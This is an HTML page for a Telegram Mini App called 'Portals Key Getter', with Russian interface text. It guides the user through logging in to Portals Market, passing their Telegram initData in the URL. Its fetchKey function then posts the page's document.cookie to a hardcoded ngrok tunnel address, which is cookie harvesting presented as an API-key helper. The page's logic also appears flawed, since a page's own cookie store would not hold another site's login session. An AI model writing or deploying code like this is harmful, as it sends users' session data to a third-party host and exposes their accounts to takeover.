<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background:var(--tg-theme-bg-color);color:var(--tg-theme-text-color);display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;">
    <h3 id="title">🔑 Portals Key Getter</h3>
    <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Инициализация...</p>
    
    <button id="btn" onclick="startAuth()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;margin-top:10px;">
        Начать авторизацию
    </button>

    <script>
        const t = window.Telegram.WebApp;
        t.expand();
        const statusEl = document.getElementById('status');
        const btn = document.getElementById('btn');
        const NGROK_URL = "https://7793-31-76-55-178.ngrok-free.app/webhook";

        // Проверяем наличие initData
        if (!t.initData) {
            statusEl.innerHTML = "❌ Запустите через кнопку в Telegram боте (/portals).";
        } else {
            // Сразу предлагаем начать авторизацию
            statusEl.innerHTML = "⚠️ Требуется вход в Portals Market.<br>Нажмите кнопку ниже.";
            btn.style.display = "block";
        }

        function startAuth() {
            statusEl.innerHTML = "🔄 Открываю страницу входа Portals...<br><br>Пожалуйста, войдите в аккаунт в открывшемся окне. После входа вернитесь сюда и нажмите 'Забрать ключ'.";
            
            // Кодируем initData для передачи в URL
            const encodedData = encodeURIComponent(t.initData);
            
            // Открываем ссылку на дашборд/вход Portals. 
            // Они должны распознать tgWebAppData и автоматически авторизовать.
            const authUrl = `https://portal-market.com/dashboard?tgWebAppData=${encodedData}`;
            
            t.openLink(authUrl);
            
            // Меняем кнопку на "Забрать ключ" после попытки входа
            setTimeout(() => {
                statusEl.innerHTML = "✅ Если вы успешно вошли, нажмите кнопку ниже.";
                btn.innerText = "Забрать API Key";
                btn.onclick = fetchKey;
            }, 3000);
        }

        function fetchKey() {
            statusEl.innerHTML = "⏳ Проверка сессии и запрос ключа...";
            btn.disabled = true;

            // Проверяем, появились ли куки после входа
            if (!document.cookie || document.cookie.length < 10) {
                statusEl.innerHTML = "❌ Куки не обнаружены. Возможно, вход не прошел.<br>Попробуйте нажать 'Начать авторизацию' снова.";
                btn.innerText = "Попробовать снова";
                btn.onclick = startAuth;
                btn.disabled = false;
                return;
            }

            fetch(NGROK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ cookies: document.cookie })
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'ok') {
                    statusEl.innerHTML = "✅ Ключ успешно получен!<br>Проверьте личку бота.";
                    setTimeout(() => t.close(), 3000);
                } else {
                    statusEl.innerHTML = "❌ Ошибка API:<br>" + (d.details || d.msg);
                    btn.disabled = false;
                }
            })
            .catch(e => {
                statusEl.innerHTML = "❌ Сетевая ошибка:<br>" + e.message;
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
